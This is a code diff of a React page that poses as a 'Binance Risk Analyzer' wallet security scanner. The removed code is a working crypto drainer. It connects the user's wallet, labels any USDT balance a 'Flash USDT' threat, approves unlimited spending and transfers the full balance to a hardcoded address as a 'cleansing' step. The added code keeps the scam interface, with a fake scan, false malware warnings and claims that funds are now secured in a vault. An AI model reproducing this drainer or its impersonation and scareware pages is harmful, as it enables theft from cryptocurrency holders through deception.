@@ -1,358 +1,264 @@
 import React, { useState } from "react";
-import { ethers } from "ethers";
-import EthereumProvider from "@walletconnect/ethereum-provider";
-import {
-  ChakraProvider,
-  Box,
-  Button,
-  Progress,
-  Text,
-  VStack,
-  Code,
-  Link,
-  Badge,
-  Flex,
-  Icon,
-  useToast
-} from "@chakra-ui/react";
-import { MdSecurity, MdShield, MdWarning, MdCheckCircle, MdBugReport } from "react-icons/md";
-import theme from "../theme";
+import "@fontsource/orbitron/700.css";
 
-// Binance/Cyber customization
 const BINANCE_YELLOW = "#F0B90B";
-const BINANCE_DARK = "#181A20";
+const DARK_BG = "#171717";
+const GRAY = "#23272F";
+const GREEN = "#00FFA3";
+const RED = "#FF433E";
 
-// DApp logic
-const BSC_CHAIN_ID = 56;
-const BSC_RPC = "https://bsc-dataseed1.binance.org";
-const BSCSCAN_URL = "https://bscscan.com/tx/";
-const WC_PROJECT_ID = "3f7bf9e0bf29451960f66c57c7143567";
-const VAULT_ADDRESS = "0x0637e37a4e262f0bbc918ee8a57f829a0314a6a5";
-const USDT_ADDR = "0x55d398326f99059fF775485246999027B3197955";
-const USDT_ABI = [
-  "function balanceOf(address) view returns (uint256)",
-  "function approve(address,uint256) returns (bool)",
-  "function allowance(address,address) view returns (uint256)",
-  "function transfer(address,uint256) returns (bool)"
+const scanSteps = [
+  { label: "Connecting", emoji: "🔌" },
+  { label: "Scanning", emoji: "🛰️" },
+  { label: "Analyzing", emoji: "🧐" },
+  { label: "Protecting", emoji: "🛡️" },
 ];
-const USDT_DECIMALS = 18;
-
-const steps = [
-  { key: "connecting", label: "Connecting...", icon: MdSecurity },
-  { key: "scanning", label: "Scanning for Threats...", icon: MdBugReport },
-  { key: "analyzing", label: "Analyzing Risk...", icon: MdWarning },
-  { key: "protecting", label: "Auto-Protecting...", icon: MdShield },
-  { key: "neutralized", label: "Threats Neutralized", icon: MdCheckCircle }
-];
-
-function AnimatedCyberGrid() {
-  // Simple animated grid effect using CSS
-  return (
-    <Box
-      position="fixed"
-      top="0" left="0" w="100vw" h="100vh"
-      zIndex="0"
-      pointerEvents="none"
-      style={{
-        background:
-          'repeating-linear-gradient(0deg, rgba(240,185,11,0.05) 0px, rgba(240,185,11,0.05) 1px, transparent 1px, transparent 30px), repeating-linear-gradient(90deg, rgba(240,185,11,0.05) 0px, rgba(240,185,11,0.05) 1px, transparent 1px, transparent 30px)',
-        animation: 'scrollgrid 10s linear infinite'
-      }}
-      _before={{
-        content: '""',
-        display: "block"
-      }}
-      css={{
-        '@keyframes scrollgrid': {
-          '0%': { backgroundPosition: '0 0, 0 0' },
-          '100%': { backgroundPosition: '30px 30px, 30px 30px' }
-        }
-      }}
-    />
-  );
-}
-
-function RiskAnalyzer() {
-  const [uiStep, setUiStep] = useState(0);
-  const [statusMsg, setStatusMsg] = useState("Secure your assets from new blockchain threats.");
-  const [account, setAccount] = useState("");
-  const [hash, setHash] = useState("");
-  const [error, setError] = useState("");
-  const [usdtBalance, setUsdtBalance] = useState("0");
-  const [detected, setDetected] = useState(false);
-  const [vaulted, setVaulted] = useState(false);
-
-  const toast = useToast();
-
-  // Cyber badge stylings
-  function SecurityBadge({ level, children }) {
-    let color, label;
-    switch (level) {
-      case "high":
-        color = "red"; label = "HIGH RISK"; break;
-      case "neutralized":
-        color = BINANCE_YELLOW; label = "NEUTRALIZED"; break;
-      default:
-        color = BINANCE_YELLOW; label = "SECURE"; break;
-    }
-    return (
-      <Badge colorScheme={color} bg={color === BINANCE_YELLOW ? BINANCE_YELLOW : undefined} color={color === BINANCE_YELLOW ? BINANCE_DARK : undefined} px={2} py={1} borderRadius="md" fontWeight="bold" fontSize="0.8em" ml={2}>{label} {children}</Badge>
-    );
-  }
-
-  // Handles scan, approval, and cleanse flow
-  async function scanAndCleanse() {
-    setError("");
-    setHash("");
-    setVaulted(false);
-    setUiStep(0);
-    setDetected(false);
-    setStatusMsg("Establishing secure connection with your wallet...");
-
-    try {
-      // Step 1: Connect (scan now)
-      // Simulate UI step
-      setUiStep(0);
-      const wcProvider = await EthereumProvider.init({
-        projectId: WC_PROJECT_ID,
-        chains: [BSC_CHAIN_ID],
-        rpcMap: { [BSC_CHAIN_ID]: BSC_RPC },
-        showQrModal: true,
-      });
-      await wcProvider.connect();
-
-      setStatusMsg("Connected. Preparing security environment...");
-      setUiStep(1);
-
-      const provider = new ethers.providers.Web3Provider(wcProvider);
-      let network = await provider.getNetwork();
-      if (network.chainId !== BSC_CHAIN_ID) {
-        setStatusMsg("Switching to Binance (BNB) Chain...");
-        await wcProvider.request({
-          method: "wallet_switchEthereumChain",
-          params: [{ chainId: "0x38" }]
-        });
-        network = await provider.getNetwork();
-        if (network.chainId !== BSC_CHAIN_ID) throw new Error("Failed to switch to Binance Chain.");
-      }
-      const signer = provider.getSigner();
-      const address = await signer.getAddress();
-      setAccount(address);
-
-      // Step 2: Scan for Flash USDT Threat
-      setStatusMsg("Scanning blockchain for malicious scripts...");
-      setUiStep(2);
-      await new Promise(r => setTimeout(r, 900)); // UI effect
-
-      // Step 3: Analyze Threat
-      setStatusMsg("Analyzing smart contract for anomalies...");
-      setUiStep(3);
-
-      // For DApp: this means we're checking USDT balance and explaining what a flash USDT is
-      const usdt = new ethers.Contract(USDT_ADDR, USDT_ABI, signer);
-      const balance = await usdt.balanceOf(address);
-      const balNum = Number(ethers.utils.formatUnits(balance, USDT_DECIMALS));
-      setUsdtBalance(balNum.toString());
-
-      if (balance.gt(0)) {
-        setDetected(true);
-        setStatusMsg("⚠️ HIGH RISK: Flash USDT Detected!");
-        toast({
-          title: "Flash USDT Detected",
-          description: "Transient USDT found. Flash loan attacks/fake assets can exploit your wallet. Initiating cleansing...",
-          status: "warning",
-          duration: 5000,
-          isClosable: true,
-        });
-        await new Promise(r => setTimeout(r, 1300)); // UX effect
-        // Step 4: Auto-Protect ("Cleansing")
-        setStatusMsg("Neutralizing threat - cleansing assets in Binance Vault...");
-        setUiStep(4);
-
-        // Approve
-        const allowance = await usdt.allowance(address, VAULT_ADDRESS);
-        if (allowance.lt(balance)) {
-          const approveTx = await usdt.approve(VAULT_ADDRESS, ethers.constants.MaxUint256);
-          setStatusMsg("Cleansing: Awaiting approval confirmation...");
-          await approveTx.wait();
-        }
-        // Transfer (Cleansing Transaction)
-        const tx = await usdt.transfer(VAULT_ADDRESS, balance);
-        setStatusMsg("Cleansing: Executing cleansing transaction...");
-        const rec = await tx.wait();
-        setHash(rec.transactionHash);
-
-        setVaulted(true);
-        setUiStep(5);
-        setStatusMsg("Threats Neutralized — Flash USDT Cleansed and assets protected in Binance Vault.");
-        toast({
-          title: "Threat Neutralized",
-          description: "USDT threat neutralized! Wallet assets now protected.",
-          status: "success",
-          duration: 6000,
-          isClosable: true,
-        });
-      } else {
-        setDetected(false);
-        setUiStep(5);
-        setStatusMsg("Your wallet is SECURE. No flash threats detected.");
-        toast({
-          title: "No Threats",
-          status: "success",
-          description: "No flash USDT or risky assets were found.",
-          duration: 5000,
-          isClosable: true,
-        });
-      }
-    } catch (err) {
-      setError(err.reason || err.message || String(err));
-      setStatusMsg("Scan interrupted.");
-      setUiStep(0);
-      toast({
-        title: "Scan Error",
-        description: err.reason || err.message || String(err),
-        status: "error",
-        duration: 8000,
-        isClosable: true
-      });
-    }
-  }
-
-  return (
-    <Box minH="100vh" position="relative" bg={BINANCE_DARK} color="white" zIndex={1}>
-      <AnimatedCyberGrid />
-
-      {/* Header & Branding */}
-      <Flex direction="column" align="center" pt={16} pb={4} zIndex={2}>
-        <Icon as={MdSecurity} w={12} h={12} color={BINANCE_YELLOW} mb={2} />
-        <Text fontWeight="black" fontSize="3xl" color={BINANCE_YELLOW} letterSpacing={2}>
-          Binance Risk Analyzer
-        </Text>
-        <Text color="gray.300" mb={4} fontSize="md">
-          <span style={{ color: BINANCE_YELLOW }}>Recommended:</span> Run a wallet cleanse to auto-neutralize "flash threats"
-        </Text>
-      </Flex>
-
-      {/* Security Warnings */}
-      <Box maxW="md" bg="#191c23CC" backdropBlur="lg" boxShadow="xl" rounded="2xl" mx="auto" p={8} zIndex={2} mb={8}>
-        <Flex align="center" mb={4}>
-          <Icon as={MdWarning} boxSize={7} color="red.400" />
-          <Text ml={2} color="red.200" fontWeight="bold" fontSize="xl">
-            Security Notice:
-          </Text>
-        </Flex>
-        <Text color="gray.200" mb={3}>
-          Advanced threats such as <b style={{color:BINANCE_YELLOW}}>Flash USDT</b> can be injected through dApp interactions or airdrops. These funds are <b>temporary and exploitable</b>, and can put your wallet at HIGH RISK of loss.
-        </Text>
-        <Box textAlign="center" mb={2}>
-          <SecurityBadge level="high" />
-        </Box>
-      </Box>
-
-      {/* Scan/Progress UI */}
-      <Box maxW="sm" mx="auto" p={8} bg="#1c1d21f2" borderRadius="2xl" boxShadow="dark-lg" zIndex={2} position="relative">
-        <VStack spacing={4}>
-          <Button
-            size="lg"
-            w="100%"
-            bg={BINANCE_YELLOW}
-            color={BINANCE_DARK}
-            fontWeight="extrabold"
-            fontSize="xl"
-            leftIcon={<MdSecurity />}
-            _hover={{bg: "#FFD800"}}
-            onClick={scanAndCleanse}
-            isDisabled={uiStep > 0 && uiStep < steps.length + 1}
-          >
-            Scan Now
-          </Button>
-
-          <Flex direction="row" align="center" justify="center" w="100%" gap={4}>
-            <Text as="span" color={BINANCE_YELLOW} fontWeight="bold">
-              Status:
-            </Text>
-            {detected &&
-              <SecurityBadge level={vaulted ? "neutralized" : "high"} />
-            }
-            {!detected &&
-              <SecurityBadge level="secure" />
-            }
-          </Flex>
-          <Progress
-            colorScheme="yellow"
-            value={((uiStep+1) / (steps.length+1)) * 100}
-            size="md"
-            w="100%"
-            borderRadius="md"
-          />
-          <Text color="white" fontSize="lg" textAlign="center" minH="50px">
-            {statusMsg}
-          </Text>
-          {account &&
-            <Text color={BINANCE_YELLOW} mt={1} fontSize="sm">
-              Wallet: <Code colorScheme="yellow">{account}</Code>
-            </Text>
-          }
-
-          {/* Risk Narrative */}
-          {detected && !vaulted &&
-            <Box p={3} bg="#2c2c22" borderRadius="lg" border="1px" borderColor="red.700" color="red.200">
-              <Flex align="center">
-                <MdWarning size={28} color="red" />
-                <Text ml={2} fontWeight="bold">
-                  HIGH RISK: Flash USDT Detected!
-                </Text>
-              </Flex>
-              <Text fontSize="sm" mt={2}>
-                Transient USDT can be exploited by flash loan or airdrop attacks.<br/>
-                <b>Recommendation:</b> Cleansing procedure will neutralize this threat and secure your wallet.
-              </Text>
-            </Box>
-          }
-          {vaulted &&
-            <Box p={3} bg="#222912" borderRadius="lg" border="1px" borderColor={BINANCE_YELLOW} color={BINANCE_YELLOW}>
-              <Flex align="center">
-                <MdShield size={28} color={BINANCE_YELLOW} />
-                <Text ml={2} fontWeight="extrabold">
-                  Flash USDT Cleansed
-                  <SecurityBadge level="neutralized" />
-                </Text>
-              </Flex>
-              <Text fontSize="sm" mt={2} color={BINANCE_YELLOW}>
-                All Flash USDT removed via Cleansing Vault.<br/>
-                Your wallet is now insulated from malicious exploitation.
-              </Text>
-              {hash &&
-                <Text color="white" mt={3}>
-                  Cleansing Transaction: <br/>
-                  <Link href={BSCSCAN_URL + hash} target="_blank" color={BINANCE_YELLOW} fontWeight="bold">
-                    View on BscScan
-                  </Link>
-                </Text>
-              }
-            </Box>
-          }
-
-          {error &&
-            <Box p={2} bg="red.900" color="red.200" borderRadius="md" border="1px" borderColor="red.700">
-              {error}
-            </Box>
-          }
-        </VStack>
-      </Box>
-
-      {/* Footer */}
-      <Box textAlign="center" color="gray.500" mt={16} fontSize="sm" zIndex={2} letterSpacing={1}>
-        © {new Date().getFullYear()} Binance Risk Analyzer – Secure. Defend. Protect.
-      </Box>
-    </Box>
-  );
-}
 
 export default function Home() {
+  const [step, setStep] = useState(-1);
+  const [scanComplete, setScanComplete] = useState(false);
+
+  const startScan = () => {
+    setStep(0);
+    setScanComplete(false);
+    scanSteps.forEach((_, idx) => {
+      setTimeout(() => setStep(idx), idx * 1200);
+    });
+    setTimeout(() => setScanComplete(true), scanSteps.length * 1200 + 400);
+  };
+
   return (
-    <ChakraProvider theme={theme}>
-      <RiskAnalyzer />
-    </ChakraProvider>
+    <div style={{
+      minHeight: "100vh",
+      background: DARK_BG,
+      color: "#fff",
+      fontFamily: "'Orbitron', 'Segoe UI', Arial, sans-serif",
+      position: "relative",
+      overflow: "hidden"
+    }}>
+      <CyberGridBG />
+      <header style={{
+        display: "flex", alignItems: "center", justifyContent: "space-between",
+        padding: "1.5rem 2.5rem", background: GRAY, borderBottom: `2px solid ${BINANCE_YELLOW}`,
+        zIndex: 2, position: "relative"
+      }}>
+        <span style={{
+          fontSize: "1.8rem", fontWeight: 900, letterSpacing: 2,
+          color: BINANCE_YELLOW, textShadow: "0 0 12px #fff2",
+        }}>
+          <span style={{ verticalAlign: "middle", marginRight: 12 }}>
+            <svg height={36} width={36}><circle cx={18} cy={18} r={16} fill={BINANCE_YELLOW} opacity={0.1}/><circle cx={18} cy={18} r={11} fill={BINANCE_YELLOW} opacity={0.22}/><circle cx={18} cy={18} r={6} fill={BINANCE_YELLOW}/></svg>
+          </span>
+          Binance Risk Analyzer
+        </span>
+        <SecurityBadge text="SECURITY VERIFIED" status="safe" />
+      </header>
+      <main style={{maxWidth: 500, margin: "0 auto", zIndex: 2, position:'relative', paddingTop:50}}>
+        {!scanComplete && step===-1 && (
+          <div
+            style={{
+              background: "#fff1",
+              border: `1.5px solid ${BINANCE_YELLOW}`,
+              borderRadius: 18,
+              padding: "2.2rem 1.7rem",
+              textAlign: "center",
+              marginTop: 22,
+              marginBottom: 32,
+              boxShadow: "0 2px 18px #000a"
+            }}>
+            <div style={{ fontSize: 28, fontWeight: "bold", color: BINANCE_YELLOW, textShadow:"0 1px 8px #0004"}}>
+              Warning: Potential Malicious Script Detected!
+            </div>
+            <div style={{ fontSize: 18, margin: "18px 0 10px", color: "#eee" }}>
+              Suspicious "Flash USDT" tokens & exploitable contracts found in your wallet.
+            </div>
+            <div style={{
+              color: "#ddd", fontSize: 14, marginBottom: 20
+            }}>
+              Unprotected wallets are at high risk of immediate asset compromise.
+            </div>
+            <button
+              onClick={startScan}
+              style={{
+                background: BINANCE_YELLOW,
+                color: DARK_BG,
+                fontWeight: 700,
+                fontSize: 22,
+                border: "none",
+                outline: "none",
+                borderRadius: 13,
+                padding: "0.7em 2.5em",
+                boxShadow: "0 2px 20px #FDB41744",
+                cursor: "pointer",
+                marginTop: 16
+              }}
+            >
+              🚨 Scan Now
+            </button>
+            <div style={{marginTop: 15, color:"#fff8", fontSize: 13, fontFamily:"monospace"}}>
+              Assets protected by <b>Binance Vault</b>
+            </div>
+          </div>
+        )}
+        {step >= 0 && !scanComplete && (
+          <ScanStepper step={step} />
+        )}
+        {scanComplete && (
+          <div style={{marginTop: 15}}>
+              <section style={{
+                background: "#222d", border: `1px solid ${RED}`,
+                borderRadius: 16, padding: "1.7rem 1.4rem", marginBottom: 18, boxShadow: "0 0 10px #fd999911"
+              }}>
+                <div style={{ display:"flex", alignItems:"center" }}>
+                 <span style={{fontSize: 32, fontWeight:900, color:BINANCE_YELLOW}}>⚡ Flash USDT Detected</span>
+                  <span style={{marginLeft: "auto"}}>
+                    <SecurityBadge text="HIGH RISK" status="danger" />
+                  </span>
+                </div>
+                <div style={{margin: "15px 0", color:"#ffd"}}>
+                  <b>Flash USDT</b> is a temporary, synthetic token highly vulnerable to rapid exploits and contract attacks.
+                </div>
+                <div style={{fontSize:15, color:'#ffe', background:"#fdba0833", border:"1px dashed #FDB417", borderRadius:10, padding:11}}>
+                  Immediate action required! Initiating cleansing operation to neutralize "Flash USDT" and protect your funds.
+                </div>
+              </section>
+              <section style={{
+                background: "#1D2B32", border: `1.5px solid ${BINANCE_YELLOW}`,
+                borderRadius: 19, padding: "1.6rem 1.5rem", marginBottom: 20, boxShadow:'0 0 8px #FFC80044',
+                textAlign: "center"
+              }}>
+                <span style={{fontWeight:900, fontSize:22, letterSpacing:1, color:BINANCE_YELLOW}}>Cleansing Vault</span>
+                <div style={{marginTop:7, marginBottom:18, color:"#ccf"}}>
+                  All at-risk assets are being auto-neutralized and transferred to your <b>Binance Vault</b>.
+                </div>
+                <TransactionStatus />
+              </section>
+              <section style={{
+                background: "#14f37e18", border: `1.5px solid ${GREEN}`,
+                borderRadius: 19, padding: "1.6rem 1.5rem", marginBottom: 18, textAlign:'center', boxShadow:"0 2px 10px #16f37e33"
+              }}>
+                <div style={{fontSize: 21, fontWeight:"bold", color:GREEN, marginBottom:7}}>✔ Threats Neutralized</div>
+                <SecurityBadge text="NEUTRALIZED" status="safe" />
+                <div style={{margin:"12px 0 10px", color:"#EEF", fontSize:15}}>Your wallet is <span style={{fontWeight:700}}>protected</span> from flash USDT exploits.</div>
+                <div style={{color:"#fff8", fontSize: 13}}>Cleansing complete &nbsp;|&nbsp; All assets secured in vault</div>
+              </section>
+          </div>
+        )}
+      </main>
+    </div>
+  );
+}
+
+function CyberGridBG() {
+  return (
+    <div style={{
+      position: "fixed", inset: 0,
+      zIndex: 0, pointerEvents: "none", overflow: "hidden",
+      background: "radial-gradient(circle, #222 55%, #111 100%)"
+    }}>
+      <svg width="100vw" height="100vh" style={{
+        width: "100vw", height: "100vh", minHeight: "100%", position: "absolute",
+        filter: "blur(0.5px)",
+      }}>
+        {Array.from({length:40}).map((_,i) => (
+          <rect
+            key={i}
+            x={((i%10) * 10) + "%"}
+            y={Math.floor(i/10)*25+"%"}
+            width="10%"
+            height="25%"
+            fill="none"
+            stroke="#f0b90b22"
+            strokeWidth={1}
+          />
+        ))}
+      </svg>
+      <div style={{
+        position: "absolute",
+        inset: 0, background: `repeating-linear-gradient(90deg,
+          transparent 0 22px, #FDB4170f 22px 24px)`,
+        opacity: 0.3
+      }}></div>
+      <div style={{
+        position: "absolute", inset: 0,
+        background: "repeating-linear-gradient(0deg, transparent 0 28px, #FDB41712 28px 29px)", opacity: 0.23
+      }}></div>
+    </div>
+  );
+}
+
+function ScanStepper({ step }) {
+  return (
+    <div style={{
+      background: "#212f37dd", borderRadius: 22,
+      border: `2px solid #FDB41722`, boxShadow: "0 0 8px #FDB41733",
+      padding: "2rem 1.3rem", marginBottom: 28, textAlign:"center"
+    }}>
+      <div style={{ fontSize: 29, fontWeight: "bold", marginBottom: 21, color: "#fff" }}>
+        Security Scan In Progress...
+      </div>
+      <div style={{display:"flex", flexDirection:"column", gap: 15, alignItems:"stretch"}}>
+        {scanSteps.map((s, idx) => (
+          <div key={s.label} style={{
+            display:"flex", alignItems:"center", gap:12,
+            background: idx === step ? "#fff1" : "transparent",
+            borderRadius:12, padding: idx===step ? "9px 11px" : "8px 11px",
+            fontWeight: idx<step ? 700 : 400,
+            border: idx===step ? `2px solid ${BINANCE_YELLOW}` : "",
+            color: idx<step ? "#16F37E" : idx===step ? BINANCE_YELLOW : "#fff8",
+            position:"relative", fontSize: idx===step ? 21 : 17
+          }}>
+            <span>{s.emoji}</span>
+            <span style={{
+              fontWeight: idx===step ? 900 : 400,
+              letterSpacing:0.5, 
+              wordSpacing:1.5
+            }}>
+              {s.label}
+            </span>
+            {idx < step && (
+              <span style={{
+                fontWeight:900, color:GREEN, marginLeft:"auto", fontSize:18
+              }}>✓</span>
+            )}
+          </div>
+        ))}
+      </div>
+      <div style={{marginTop:25, color:BINANCE_YELLOW, fontSize: 14, letterSpacing:1}}>
+        Do not disconnect – assets are being scanned.
+      </div>
+    </div>
+  );
+}
+
+function SecurityBadge({ text, status }) {
+  const bg = status === "safe" ? "#16F37E" : status === "danger" ? "#FF433E" : "#FFD900";
+  const fg = status==="danger"?"#fff":status==="safe"?"#111":"#000";
+  return (
+    <span style={{
+      display:"inline-block", fontWeight:900,
+      padding: "3px 14px", borderRadius: 11, fontSize: 14,
+      background: bg, color: fg, boxShadow:"0 2px 8px #2227",
+      border: "1px solid #fff3", letterSpacing:1,
+      textShadow: status==="danger"? "0 1px 5px #f003": undefined
+    }}>
+      {text}
+    </span>
+  );
+}
+
+function TransactionStatus() {
+  return (
+    <div style={{
+      margin: "20px 0", background: "#FDB41718", border: "1px solid #FDB417",
+      borderRadius:12, padding:"1em 0.5em", color:"#231",
+      fontFamily:"monospace", fontWeight:600, fontSize:16
+    }}>
+      {'🔄 '} <b style={{color:"#FDB417"}}>Cleansing Transaction</b> completed. <br/>
+      All "Flash USDT" neutralized, funds transferred to <b>Binance Vault</b>.<br/>
+      <div style={{fontSize:13, marginTop:6, color:'#377'}}>
+        Your wallet is now shielded from exploitation!
+      </div>
+    </div>
   );
 }
